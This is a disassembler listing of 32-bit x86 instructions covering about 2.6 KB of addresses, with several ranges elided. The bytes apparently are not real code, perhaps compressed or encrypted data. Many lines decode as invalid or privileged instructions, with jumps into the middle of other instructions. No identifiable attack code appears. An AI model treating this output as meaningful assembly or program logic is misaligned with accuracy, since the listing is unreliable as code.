  4168b3:	(bad)  
  4168b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168b5:	test   eax,0x84973e11
  4168ba:	pusha  
  4168bb:	mov    edi,0xb612221e
  4168c0:	(bad)  
  4168c1:	in     eax,0x70
  4168c3:	ds scas al,BYTE PTR es:[edi]
  4168c5:	or     cl,BYTE PTR [ebx+0x7b126eb6]
  4168cb:	shr    BYTE PTR [edi+0x7],0xeb
  4168cf:	adc    al,0xc6
  4168d1:	pop    ebp
  4168d2:	shr    DWORD PTR [edx],1
  4168d4:	or     ch,BYTE PTR [edi]
  4168d6:	sbb    esp,ebp
  4168d8:	sbb    ch,bh
  4168da:	out    dx,al
  4168db:	mov    edx,0x718df37e
  4168e0:	xor    BYTE PTR [edi-0x57],dh
  4168e3:	xchg   esp,eax
  4168e4:	jl     0x4168b9
  4168e6:	xchg   DWORD PTR [ebp-0x9],eax
  4168e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168ea:	xor    dl,BYTE PTR [esi-0x54]
  4168ed:	inc    eax
	...
  416956:	shr    DWORD PTR [edi-0x4810cfa],1
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0xec19fde4
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
  41696c:	add    BYTE PTR [eax],al
  41696e:	mul    ecx
  416970:	gs add bl,bl
  416973:	xor    bl,cl
  416975:	sub    edx,ebx
  416977:	xor    eax,0xcf04fbac
  41697c:	enter  0x60f1,0xa0
  416980:	sbb    eax,0x47332007
  416985:	popf   
  416986:	fnstenv [ebx]
  416988:	aas    
  416989:	cwde   
  41698a:	push   0xf0abaaba
  41698f:	(bad)  
  416990:	clc    
  416991:	cwde   
  416992:	(bad)  
  416993:	popf   
  416994:	adc    DWORD PTR [esi-0x4ff079c1],ebx
  41699a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41699b:	aam    0x2d
  41699d:	mov    eax,ds:0xe6ee1a43
  4169a2:	inc    edi
  4169a3:	sbb    bl,dh
  4169a5:	(bad)  
  4169a6:	out    0xdc,al
  4169a8:	push   ss
  4169a9:	pop    esp
  4169aa:	cld    
  4169ab:	call   0xec0dbac2
  4169b0:	adc    DWORD PTR [ebx-0x709ee9cb],eax
  4169b6:	pop    ebx
  4169b7:	inc    ebx
  4169b8:	mov    es,edx
  4169ba:	mov    dh,0x48
  4169bc:	fcomp  DWORD PTR [eax]
  4169be:	shl    bh,1
  4169c0:	and    BYTE PTR [eax+eiz*8],bh
  4169c3:	sbb    al,0x5f
  4169c5:	fxtract 
  4169c7:	or     edi,DWORD PTR [esi]
  4169c9:	mov    bl,0xd1
  4169cb:	mov    esp,0x32d0227e
  4169d0:	xchg   BYTE PTR [esi-0x746859a5],bh
  4169d6:	hlt    
  4169d7:	dec    edx
  4169d8:	aaa    
  4169d9:	xchg   ebp,eax
  4169da:	adc    cl,bh
  4169dc:	mov    ds:0xe8d36c7e,al
  4169e1:	add    al,0x5a
  4169e3:	lods   al,BYTE PTR ds:[esi]
  4169e4:	mov    esi,0x9725a89f
  4169e9:	dec    esi
  4169ea:	aad    0x7d
  4169ec:	mov    cl,bh
  4169ee:	sub    al,0xdd
  4169f0:	mov    DWORD PTR [eax+0x7e],esp
  4169f3:	fs sbb cl,bl
  4169f6:	pop    ebx
  4169f7:	push   cs
  4169f8:	adc    eax,esp
  4169fa:	sbb    DWORD PTR [esi+edx*8+0x3cae9171],0x64
  416a02:	stos   BYTE PTR es:[edi],al
  416a03:	add    eax,0x2497fe75
  416a08:	lods   al,BYTE PTR ds:[esi]
  416a09:	push   edi
  416a0a:	(bad)  
  416a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a0c:	dec    esp
  416a0d:	xchg   ebx,eax
  416a0e:	xchg   esi,eax
  416a0f:	xor    al,0x52
  416a11:	pop    ebx
  416a12:	std    
  416a13:	jns    0x416a6f
  416a15:	(bad)  
  416a16:	sbb    esi,edx
  416a18:	fild   QWORD PTR [ebx+0x76]
  416a1b:	jge    0x4169e9
  416a1d:	or     al,0xc0
  416a1f:	sub    al,0xad
  416a21:	mov    dh,BYTE PTR [ebp-0x51]
  416a24:	mov    esp,0xfbd982be
  416a29:	xlat   BYTE PTR ds:[ebx]
  416a2a:	scas   al,BYTE PTR es:[edi]
  416a2b:	jb     0x416a0c
  416a2d:	xchg   DWORD PTR [ebx],edx
  416a2f:	repz test DWORD PTR [ecx-0x22604bb2],ebp
  416a36:	test   DWORD PTR [ecx+eax*8-0x7bac25ff],0x11fd1acb
  416a41:	mov    WORD PTR [ebx-0x29990ab],ds
  416a47:	dec    ecx
  416a48:	jb     0x416a0a
  416a4a:	mov    bh,0x43
  416a4c:	sub    ebp,DWORD PTR [ebx-0x2f1fe783]
  416a52:	push   ss
  416a53:	sahf   
  416a54:	jne    0x416a2f
  416a56:	imul   edx,DWORD PTR [eax-0x10],0xffffffac
  416a5a:	icebp  
  416a5b:	cld    
  416a5c:	dec    esi
  416a5d:	dec    edi
  416a5e:	stos   BYTE PTR es:[edi],al
  416a5f:	mov    ah,0xce
  416a61:	jmp    0x4169fe
  416a63:	pop    esp
  416a64:	jbe    0x4169fa
  416a66:	or     eax,0x4b8897cc
  416a6b:	aam    0xb6
  416a6d:	xchg   ebp,eax
	...
  416ad6:	retf   
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0x5b900ba3
  416ae4:	or     al,0x4d
  416ae6:	addr16 hlt 
  416ae8:	add    BYTE PTR [eax],al
  416aea:	add    BYTE PTR [ecx],al
  416aec:	add    BYTE PTR [eax],al
  416aee:	test   BYTE PTR [edi+ebx*1],ah
  416af1:	scas   al,BYTE PTR es:[edi]
  416af2:	adc    eax,0x440ac5ab
  416af7:	or     ch,BYTE PTR es:[esi+edx*8-0x44f7becd]
  416aff:	push   ebp
  416b00:	aaa    
  416b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b02:	in     al,0xfa
  416b04:	test   DWORD PTR [ebp-0x1b],ebp
  416b07:	outs   dx,DWORD PTR ds:[esi]
  416b08:	ror    BYTE PTR [edi+0x77b879ff],1
  416b0e:	jne    0x416b46
  416b10:	xchg   edx,eax
  416b11:	icebp  
  416b12:	int3   
  416b13:	adc    dh,bl
  416b15:	sbb    BYTE PTR [eax+ebp*2+0x728aaad9],al
  416b1c:	push   es
  416b1d:	and    al,BYTE PTR [eax-0x5f0eb300]
  416b23:	ja     0x416b39
  416b25:	(bad)  
  416b26:	cld    
  416b27:	xchg   edx,eax
  416b28:	pushf  
  416b29:	cs pushf 
  416b2b:	retf   
  416b2c:	dec    esi
  416b2d:	adc    eax,0x1e734c95
  416b32:	xchg   esi,eax
  416b33:	pop    edi
  416b34:	out    0xfe,eax
  416b36:	mov    ch,0x80
  416b38:	push   ecx
  416b39:	aas    
  416b3a:	cli    
  416b3b:	xor    BYTE PTR ds:0xb2be9465,dh
  416b41:	pop    ds
  416b42:	or     BYTE PTR [edx+0x1e6d95ac],bh
  416b48:	add    BYTE PTR [edx-0x48425495],cl
  416b4e:	rol    DWORD PTR [ebp+0x11220cc6],0xc4
  416b55:	pop    eax
  416b56:	push   cs
  416b57:	popa   
  416b58:	and    ecx,DWORD PTR [eax-0x69]
  416b5b:	sub    DWORD PTR [esi+0x5a950c23],edx
  416b61:	(bad)  
  416b62:	test   BYTE PTR [eax+0x20],ch
  416b65:	aas    
  416b66:	not    esi
  416b68:	add    eax,0x6e42cc57
  416b6d:	lock mov al,0x64
  416b70:	or     al,0xc6
  416b72:	fwait
  416b73:	or     eax,0x1c95d811
  416b78:	mov    esp,0x30cd66a0
  416b7d:	pop    ecx
  416b7e:	es fs retf 0x3f7b
  416b83:	pop    es
  416b84:	pop    es
  416b85:	pop    edi
  416b86:	fld    DWORD PTR [ecx+0x1e]
  416b89:	iret   
  416b8a:	jmp    0x392:0xb802caea
  416b91:	js     0x416b83
  416b93:	jg     0x416bd1
  416b95:	fimul  DWORD PTR [esi]
  416b97:	pop    ebx
  416b98:	jle    0x416b63
  416b9a:	or     DWORD PTR [ebx+0x62],edi
  416b9d:	repz cmp DWORD PTR [edx+ebx*2],esi
  416ba1:	inc    esp
  416ba2:	sub    bh,ah
  416ba4:	or     al,0xaf
  416ba6:	sub    BYTE PTR [edi],cl
  416ba8:	cld    
  416ba9:	ds jp  0x416bce
  416bac:	sti    
  416bad:	inc    esi
  416bae:	mov    DWORD PTR [edi],esp
  416bb0:	or     al,0x7c
  416bb2:	cmp    BYTE PTR [edx],cl
  416bb4:	sub    al,0x4e
  416bb6:	or     cl,BYTE PTR [edi-0x379f849f]
  416bbc:	mov    ebp,0x419912fc
  416bc1:	xor    BYTE PTR [ecx-0x285c0310],0x8
  416bc8:	xchg   ebx,eax
  416bc9:	arpl   ax,cx
  416bcb:	call   0x32ffc8ec
  416bd0:	push   edi
  416bd1:	fyl2x  
  416bd3:	and    DWORD PTR [ecx+0x4e17249f],ecx
  416bd9:	xor    al,0xc0
  416bdb:	cld    
  416bdc:	mov    ecx,ebp
  416bde:	or     BYTE PTR [ebp+0x8621375],cl
  416be4:	aad    0x36
  416be6:	ss cli 
  416be8:	jmp    0x187d888b
  416bed:	xchg   ebx,eax
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0xeb5b70a9
  416c63:	xor    edi,edx
  416c65:	cwde   
  416c66:	addr16 cmc 
  416c68:	add    BYTE PTR [eax],al
  416c6a:	add    BYTE PTR [ecx],al
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	xor    ebp,DWORD PTR [esi]
  416c70:	mov    eax,ds:0x84a4eabd
  416c75:	in     eax,dx
  416c76:	jno    0x416cd9
  416c78:	es mov ebp,0x382f18a4
  416c7e:	inc    ebp
  416c7f:	ret    
  416c80:	dec    edx
  416c81:	add    al,0xc6
  416c83:	add    al,0xfe
  416c85:	je     0x416cef
  416c87:	pop    esp
  416c88:	sti    
  416c89:	mov    WORD PTR [eax-0x2ecc75e0],?
  416c8f:	and    al,0x2
  416c91:	xchg   esp,eax
  416c92:	cmp    dh,BYTE PTR [ebp*1+0x4528c5e6]
  416c99:	sar    BYTE PTR [esi-0x3a],1
  416c9c:	push   ss
  416c9d:	inc    eax
  416c9e:	loopne 0x416c5e
  416ca0:	pop    edi
  416ca1:	push   esp
  416ca2:	retf   
  416ca3:	pop    ebp
  416ca4:	sbb    esi,edx
  416ca6:	xchg   BYTE PTR [edx],al
  416ca8:	imul   edi,DWORD PTR [edi],0x79
  416cab:	or     eax,0xe93b5d12
  416cb0:	rcl    DWORD PTR [ebp+0x148b7dce],1
  416cb6:	clc    
  416cb7:	iret   
  416cb8:	lods   eax,DWORD PTR ds:[esi]
  416cb9:	bound  eax,QWORD PTR [ecx+0x60]
  416cbc:	pop    ds
  416cbd:	jbe    0x416c9f
  416cbf:	pop    eax
  416cc0:	xchg   edx,esi
  416cc2:	mov    cl,0x21
  416cc4:	adc    al,0xb
  416cc6:	pop    ecx
  416cc7:	push   0x3b
  416cc9:	es cmp ebx,ebp
  416ccc:	arpl   WORD PTR [edx+0x65ffd4b1],dx
  416cd2:	add    dh,bl
  416cd4:	mov    ch,0xc4
  416cd6:	test   al,0xd8
  416cd8:	jo     0x416d14
  416cda:	repz pop esp
  416cdc:	dec    eax
  416cdd:	mov    bh,0xe0
  416cdf:	jmp    0x416d0d
  416ce1:	cmp    al,0x1
  416ce3:	mul    edi
  416ce5:	mov    ecx,0x401361b8
  416cea:	jl     0x416cd2
  416cec:	mov    ah,0x8d
  416cee:	shl    DWORD PTR [ecx+edi*4],1
  416cf1:	repz (bad) 
  416cf3:	vmread ebp,ecx
  416cf6:	fstp   TBYTE PTR [eax-0x2a32ce78]
  416cfc:	in     al,0x96
  416cfe:	jg     0x416cbc
  416d00:	dec    ecx
  416d01:	push   edx
  416d02:	cmp    DWORD PTR [ebx],0xd2577983
  416d08:	add    al,0xb
  416d0a:	lea    eax,[eax+edi*8+0x15]
  416d0e:	test   al,0xa7
  416d10:	js     0x416ccc
  416d12:	push   ebp
  416d13:	mov    dl,0x2a
  416d15:	sti    
  416d16:	pop    edx
  416d17:	dec    eax
  416d18:	leave  
  416d19:	test   al,0xbf
  416d1b:	or     DWORD PTR [edx+0x1ccfcde0],edx
  416d21:	call   0x8cd3:0x1728a1eb
  416d28:	push   esi
  416d29:	xor    bl,BYTE PTR [edx]
  416d2b:	cwde   
  416d2c:	cmp    DWORD PTR [ebx],eax
  416d2e:	test   al,0xd7
  416d30:	mov    esp,0xcb126d51
  416d35:	mov    al,BYTE PTR [edi]
  416d37:	sbb    al,0xb
  416d39:	hlt    
  416d3a:	daa    
  416d3b:	or     DWORD PTR [eax-0x23],ecx
  416d3e:	dec    ebx
  416d3f:	div    DWORD PTR [eax+ebx*2+0xd98a719]
  416d46:	sub    ecx,DWORD PTR [ecx]
  416d48:	dec    edx
  416d49:	icebp  
  416d4a:	or     bh,BYTE PTR [ebp+ecx*8-0x4c]
  416d4e:	(bad)  
  416d4f:	push   ebx
  416d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d51:	pop    esi
  416d52:	ret    0x6eba
  416d55:	(bad)  
  416d56:	retf   
  416d57:	or     DWORD PTR [esi+eiz*1],ecx
  416d5a:	fs call 0x97c7:0x6304be9b
  416d62:	sbb    DWORD PTR [edx+ecx*2-0x65],esi
  416d66:	ins    BYTE PTR es:[edi],dx
  416d67:	sbb    ecx,0x79
  416d6a:	cwde   
  416d6b:	nop
  416d6c:	fwait
  416d6d:	mov    WORD PTR [eax],es
	...
  416dd3:	add    BYTE PTR [eax],al
  416dd5:	add    BYTE PTR [ecx],ah
  416dd7:	xchg   ebx,eax
  416dd8:	mov    DWORD PTR [edi-0x60d84045],ebp
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	dec    ecx
  416de3:	xchg   ebp,eax
  416de4:	push   esp
  416de5:	mov    ecx,0xf667
  416dea:	add    BYTE PTR [ecx],al
  416dec:	add    BYTE PTR [eax],al
  416dee:	jns    0x416d82
  416df0:	out    dx,al
  416df1:	out    0xa3,al
  416df3:	mov    ds:0x6cf8b609,eax
  416df8:	pop    edi
  416df9:	or     eax,0xfa010924
  416dfe:	mov    ds:0x671639cb,al
  416e03:	mov    edi,DWORD PTR [esi]
  416e05:	cmp    DWORD PTR [ebp+0x23],edx
  416e08:	rol    BYTE PTR [ecx-0x412a9b47],0x2
  416e0f:	mov    DWORD PTR [edi],ecx
  416e11:	push   esp
  416e12:	xlat   BYTE PTR ds:[ebx]
  416e13:	arpl   WORD PTR [ebx],ax
  416e15:	dec    ebx
  416e16:	mov    DWORD PTR [edi-0x57],0x79cd867f
  416e1d:	call   0xb002:0x704de329
  416e24:	xchg   esp,eax
  416e25:	inc    ebp
  416e26:	sub    al,0x76
  416e28:	and    al,0x56
  416e2a:	imul   edi,DWORD PTR [edi-0x2f028d41],0xe679d5bf
  416e34:	jae    0x416e77
  416e36:	test   dl,cl
  416e38:	sub    esi,edx
  416e3a:	fisttp DWORD PTR [ecx+0x4d]
  416e3d:	or     al,0xf0
  416e3f:	push   ebp
  416e40:	add    dl,BYTE PTR [ebx]
  416e42:	fwait
  416e43:	add    ah,0x71
  416e46:	pop    esp
  416e47:	inc    ebx
  416e48:	sub    ah,ah
  416e4a:	sub    ah,BYTE PTR [eax+0x41]
  416e4d:	mov    cl,0xab
  416e4f:	inc    eax
  416e50:	xor    cl,ch
  416e52:	rcl    BYTE PTR [ecx+0x53],1
  416e55:	(bad)  
  416e56:	gs mov esi,0xf18debff
  416e5c:	jle    0x416e61
  416e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e5f:	sti    
  416e60:	enter  0x5d35,0x72
  416e64:	xor    al,0x6e
  416e66:	std    
  416e67:	fistp  QWORD PTR [edi+0xf39efc8]
  416e6d:	sbb    ebx,0x9fc1583
  416e73:	mov    ch,0xdd
  416e75:	push   edi
  416e76:	and    ah,BYTE PTR [ecx-0x168b622a]
  416e7c:	mov    eax,ds:0x1012a63c
  416e81:	cmp    ebp,DWORD PTR [ebp+eax*8+0x3e2fb93]
  416e88:	xor    cl,ch
  416e8a:	pop    ecx
  416e8b:	and    esp,esi
  416e8d:	mov    edx,0xf927f1da
  416e92:	fstp   TBYTE PTR [ebp+0xc]
  416e95:	data16 jnp 0x416f0f
  416e98:	mov    bl,0x59
  416e9a:	xchg   edx,eax
  416e9b:	pop    esi
  416e9c:	test   al,0x5f
  416e9e:	pop    ss
  416e9f:	mov    bh,0x1c
  416ea1:	xchg   ecx,eax
  416ea2:	mov    BYTE PTR [esi-0x33],bl
  416ea5:	dec    edi
  416ea6:	cmp    edx,ecx
  416ea8:	fsubr  QWORD PTR [edi]
  416eaa:	lahf   
  416eab:	test   BYTE PTR [ebx*1+0x33a7ec9a],0x25
  416eb3:	imul   DWORD PTR [ebx+0x62b6f50]
  416eb9:	jl     0x416f1d
  416ebb:	aad    0xe
  416ebd:	sahf   
  416ebe:	jbe    0x416e7c
  416ec0:	dec    DWORD PTR [edx-0x31]
  416ec3:	pusha  
  416ec4:	sbb    esi,DWORD PTR [esi-0x60]
  416ec7:	pop    esp
  416ec8:	test   eax,0xea7bfcf4
  416ecd:	loopne 0x416eb0
  416ecf:	(bad)  
  416ed1:	and    edx,DWORD PTR [eax+ebp*8+0x48]
  416ed5:	(bad)  
  416ed6:	retf   0x1cdc
  416ed9:	jge    0x416ef3
  416edb:	pop    es
  416edc:	jb     0x416f25
  416ede:	test   al,0x8f
  416ee0:	pop    ebx
  416ee1:	mov    eax,0x5661a512
  416ee6:	std    
  416ee7:	shl    BYTE PTR [edi-0x5cfc3d2d],0xcb
	...
  416f56:	mov    edi,0xae6d8e19
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x2038eea
  416f64:	mov    al,BYTE PTR [ebp+0xf767]
  416f6a:	add    BYTE PTR [ecx],al
  416f6c:	add    BYTE PTR [eax],al
  416f6e:	pop    esi
  416f6f:	daa    
  416f70:	xchg   edx,eax
  416f71:	js     0x416f35
  416f73:	sti    
  416f74:	push   ecx
  416f75:	fwait
  416f76:	dec    ebp
  416f77:	mov    ah,0x49
  416f79:	sub    al,al
  416f7b:	pop    es
  416f7c:	xchg   bl,al
  416f7e:	add    eax,0x116dc007
  416f83:	cmp    ch,BYTE PTR [edx]
  416f85:	ds mov eax,0xac61b454
  416f8b:	xchg   edx,eax
  416f8c:	push   es
  416f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f8e:	jno    0x416f78
  416f90:	jb     0x416f8a
  416f92:	pop    esi
  416f93:	nop
  416f94:	add    edi,eax
  416f96:	adc    DWORD PTR [edi],edi
  416f98:	inc    ecx
  416f9a:	popa   
  416f9b:	in     eax,dx
  416f9c:	mov    ecx,0x2d6d987b
  416fa1:	aam    0xe2
  416fa3:	jl     0x416ff4
  416fa5:	dec    esi
  416fa6:	xor    BYTE PTR [ecx+0x6a9b6ed4],dh
  416fac:	or     al,0x4a
  416fae:	adc    ecx,DWORD PTR [ebx+0x1e]
  416fb1:	jns    0x416fe9
  416fb3:	or     bl,al
  416fb5:	mov    edx,0xc68e2dd3
  416fba:	gs jp  0x416fd5
  416fbd:	push   edx
  416fbe:	jb     0x416fd6
  416fc0:	icebp  
  416fc1:	scas   al,BYTE PTR es:[edi]
  416fc2:	outs   dx,DWORD PTR ds:[esi]
  416fc3:	jecxz  0x416f65
  416fc5:	outs   dx,DWORD PTR ds:[esi]
  416fc6:	push   ss
  416fc7:	outs   dx,BYTE PTR ds:[esi]
  416fc8:	aas    
  416fc9:	xor    eax,0x631af65
  416fce:	inc    edi
  416fcf:	push   edx
  416fd0:	add    edi,DWORD PTR ds:0x82ebc70c
  416fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fd7:	loope  0x417042
  416fd9:	pop    es
  416fda:	xchg   edx,eax
  416fdb:	mov    BYTE PTR ds:0xc6864539,0x45
  416fe2:	push   ds
  416fe3:	dec    ebp
  416fe4:	cmp    al,0x11
  416fe6:	bound  edi,QWORD PTR [edx+0x15]
  416fe9:	arpl   WORD PTR [ebp+0x22c403ef],sp
  416fef:	in     eax,dx
  416ff0:	cdq    
  416ff1:	xor    bh,BYTE PTR [ecx]
  416ff3:	dec    eax
  416ff4:	dec    esi
  416ff5:	mov    ecx,0x38011e40
  416ffa:	jns    0x416fc2
  416ffc:	inc    ecx
  416ffd:	out    dx,al
  416ffe:	gs repnz pop es
  417001:	aam    0x38
  417003:	clc    
  417004:	call   0x2fcd:0x51cba2cc
  41700b:	pop    ebp
  41700c:	std    
  41700d:	enter  0xb486,0xd6
  417011:	loopne 0x417061
  417013:	repz fisubr DWORD PTR [ebp+0x129299d6]
  41701a:	inc    eax
  41701b:	das    
  41701c:	sar    BYTE PTR [edx+0xd],0x28
  417020:	add    al,0xd4
  417022:	cmp    eax,DWORD PTR [edi-0xc]
  417025:	pop    ss
  417026:	xor    eax,0xfc95a132
  41702b:	dec    eax
  41702c:	fwait
  41702d:	mov    ebx,0x8922b7d7
  417032:	mov    gs,WORD PTR [eax]
  417034:	sbb    eax,0x690fa107
  417039:	dec    cl
  41703b:	loop   0x417082
  41703d:	sbb    ebx,DWORD PTR [ebp+0x60dcf260]
  417043:	in     eax,dx
  417044:	call   DWORD PTR [ebx]
  417046:	mov    esi,0x7c6239d2
  41704b:	ret    
  41704c:	out    0xdd,al
  41704e:	push   ds
  41704f:	hlt    
  417050:	pop    es
  417051:	int3   
  417052:	aam    0x20
  417054:	leave  
  417055:	std    
  417056:	add    DWORD PTR [edx+ecx*8-0x3d],ebx
  41705a:	sbb    edi,DWORD PTR [edi-0x12]
  41705d:	inc    esp
  41705e:	sti    
  41705f:	js     0x41708e
  417061:	out    0xc3,eax
  417063:	fcmovnbe st,st(5)
  417065:	pop    es
  417066:	lea    esp,[ecx]
  417068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417069:	dec    eax
  41706a:	leave  
  41706b:	cmp    esi,ecx
  41706d:	cmp    BYTE PTR [eax],al
	...
  4170d3:	add    BYTE PTR [eax],al
  4170d5:	add    BYTE PTR [esi+0x2d],dh
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    edx,ebx
  4170e3:	fs jo  0x417127
  4170e6:	addr16 clc 
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	add    BYTE PTR [ecx],al
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	pop    esp
  4170ef:	lahf   
  4170f0:	cmp    ebp,edi
  4170f2:	pop    esi
  4170f3:	retf   
  4170f4:	bound  esi,QWORD PTR [ecx]
  4170f6:	cmp    ch,BYTE PTR [edi+ebp*4-0x64d1d8f6]
  4170fd:	dec    esp
  4170fe:	xor    al,BYTE PTR [edx]
  417100:	inc    esp
  417101:	mov    esi,0xa0d28f39
  417106:	mov    ebp,0x4f8198b8
  41710b:	jo     0x417156
  41710d:	bts    DWORD PTR [eax-0x24],esi
  417111:	ret    
  417112:	push   esp
  417113:	out    0x1d,eax
  417115:	dec    esp
  417116:	test   DWORD PTR [esi+esi*2-0x1b8f22e4],ebp
  41711d:	test   eax,0xf81a8829
  417122:	test   eax,0x75850e04
  417127:	lahf   
  417128:	push   0xc0b8ef1c
  41712d:	mov    BYTE PTR [ebp-0x5c],ah
  417130:	ins    BYTE PTR es:[edi],dx
  417131:	ret    0xaa94
  417134:	and    eax,0x676c65b4
  417139:	ins    BYTE PTR es:[edi],dx
  41713a:	(bad)  [ecx+edx*2]
  41713d:	mov    ?,WORD PTR [eax+ebx*8-0x25049493]
  417144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417145:	sar    DWORD PTR [esi],0x50
  417148:	jl     0x417112
  41714a:	pusha  
  41714b:	in     eax,dx
  41714c:	inc    ebp
  41714d:	int3   
  41714e:	xchg   edx,eax
  41714f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417150:	adc    DWORD PTR [eax+0x78d7982e],ebx
  417156:	xchg   esi,eax
  417157:	clc    
  417158:	push   ds
  417159:	pop    ecx
  41715a:	ficomp WORD PTR [edx+0x71]
  41715d:	aam    0x12
  41715f:	add    DWORD PTR [edx],esp
  417161:	or     DWORD PTR [esi],edi
  417163:	lods   al,BYTE PTR ds:[esi]
  417164:	mov    DWORD PTR [eax+ebx*2-0x1f69f6e0],ebx
  41716b:	jp     0x417158
  41716d:	pop    ss
  41716e:	add    cl,BYTE PTR [esp+ebp*4-0x30f30edc]
  417175:	int3   
  417176:	push   esp
  417177:	mov    ebp,0xb33c616b
  41717c:	adc    al,0xe3
  41717e:	daa    
  41717f:	sbb    DWORD PTR [edi+eiz*1-0x80],edx
  417183:	xor    al,0xb7
  417185:	push   0x2de1d132
  41718a:	push   0xffffffd4
  41718c:	jno    0x41715a
  41718e:	jnp    0x4171f4
  417190:	push   ebp
  417191:	loopne 0x417142
  417193:	mov    es,WORD PTR [esi]
  417195:	mov    ?,WORD PTR [eax]
  417197:	sub    ebp,DWORD PTR [ebp+0x32]
  41719a:	mov    ebx,0x5412a093
  41719f:	mov    ebp,0x2a8b94c8
  4171a4:	pusha  
  4171a5:	scas   eax,DWORD PTR es:[edi]
  4171a6:	bound  edi,QWORD PTR ds:[eax]
  4171a9:	das    
  4171aa:	push   ecx
  4171ab:	fisttp DWORD PTR [esi+esi*1-0x79d0e593]
  4171b2:	std    
  4171b3:	xchg   esi,eax
  4171b4:	les    esp,FWORD PTR [ebx-0x65505a8c]
  4171ba:	ret    
  4171bb:	sar    DWORD PTR [ecx+0x780389c9],cl
  4171c1:	shl    ah,1
  4171c3:	sbb    ebx,ebp
  4171c5:	daa    
  4171c6:	push   edx
  4171c7:	push   ds
  4171c8:	data16 jecxz 0x4171ba
  4171cb:	or     al,0x1b
  4171cd:	mov    eax,ds:0xa95d51e
  4171d2:	jo     0x4171e1
  4171d4:	sbb    BYTE PTR [edx+edi*2],al
  4171d7:	and    BYTE PTR [edx-0x45],0xf9
  4171db:	(bad)  
  4171dc:	jne    0x4171d0
  4171de:	sub    dl,BYTE PTR [ebp+0x648d3211]
  4171e4:	fcomp  DWORD PTR [eax+esi*1]
  4171e7:	(bad)  
  4171e8:	imul   edi,ecx,0xffffffc5
  4171eb:	sub    eax,DWORD PTR [ebx+0x6c]
	...
  417255:	add    BYTE PTR [esi-0xe58fe7],ah
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	cmp    BYTE PTR [edi-0x6986fda],ah
  417268:	add    BYTE PTR [eax],al
  41726a:	add    BYTE PTR [ecx],al
  41726c:	add    BYTE PTR [eax],al
  41726e:	cs xchg esp,eax
  417270:	jae    0x417210
  417272:	xor    eax,edi
  417274:	and    al,0xde
  417276:	push   eax
  417277:	xchg   BYTE PTR [eax+0x60894928],ch
  41727d:	push   esp
  41727e:	cdq    
  41727f:	ins    BYTE PTR es:[edi],dx
  417280:	nop
  417281:	lods   al,BYTE PTR ds:[esi]
  417282:	jae    0x41728a
  417284:	cmp    esp,DWORD PTR [ebx-0x5cb2a823]
  41728a:	mov    esi,0xc1fb6c5c
  41728f:	and    al,0xca
  417291:	outs   dx,BYTE PTR ds:[esi]
  417292:	push   ds
  417293:	inc    ebp
  417294:	mov    esp,0xa4c1e468
  417299:	mov    BYTE PTR [ecx],bl
  41729b:	adc    DWORD PTR [eax+ebp*8],esi
  41729e:	mov    ebx,0x748d7685
  4172a3:	test   eax,0xa5495c88
  4172a8:	bound  esi,QWORD PTR [esi]
  4172aa:	cmp    BYTE PTR [ecx+0x5f59a170],dh
  4172b0:	adc    esi,DWORD PTR [esi]
  4172b2:	jl     0x417286
  4172b4:	daa    
  4172b5:	xchg   BYTE PTR [ebp-0xf],dl
  4172b8:	jns    0x4172a3
  4172ba:	ficomp WORD PTR [esi+0x24bfb17e]
  4172c0:	rcr    DWORD PTR [ebx+0x9152b5f],cl
  4172c6:	rcr    DWORD PTR [esi],1
  4172c8:	or     bh,bh
  4172ca:	repnz imul eax,DWORD PTR [ecx-0x5b],0x1b0c1fb0
  4172d2:	outs   dx,BYTE PTR ds:[esi]
  4172d3:	mov    al,0x57
  4172d5:	bound  esi,QWORD PTR [esi+0x62]
  4172d8:	sub    bl,BYTE PTR [edi+0x52]
  4172db:	lods   eax,DWORD PTR ds:[esi]
  4172dc:	aam    0x1c
  4172de:	mov    ds:0x6bb43e08,al
  4172e3:	(bad)  
  4172e4:	push   ecx
  4172e5:	inc    ebp
  4172e6:	lods   eax,DWORD PTR ss:[esi]
  4172e8:	xor    bh,BYTE PTR [eax]
  4172ea:	iret   
  4172eb:	call   0x66f2:0x4de869c7
  4172f2:	jbe    0x417286
  4172f4:	push   ds
  4172f5:	out    dx,al
  4172f6:	lds    esi,FWORD PTR [ebp-0x4bf12de4]
  4172fc:	int    0x6a
  4172fe:	mov    WORD PTR [edx+0x1e1838e2],es
  417304:	jg     0x4172ab
  417306:	dec    ecx
  417307:	cmp    ebx,esi
  417309:	push   cs
  41730a:	fnstenv [ecx+edx*2-0x33]
  41730e:	cmp    al,0x29
  417310:	mov    bh,0x5c
  417312:	icebp  
  417313:	imul   ebp,DWORD PTR [eax-0x65],0x6b
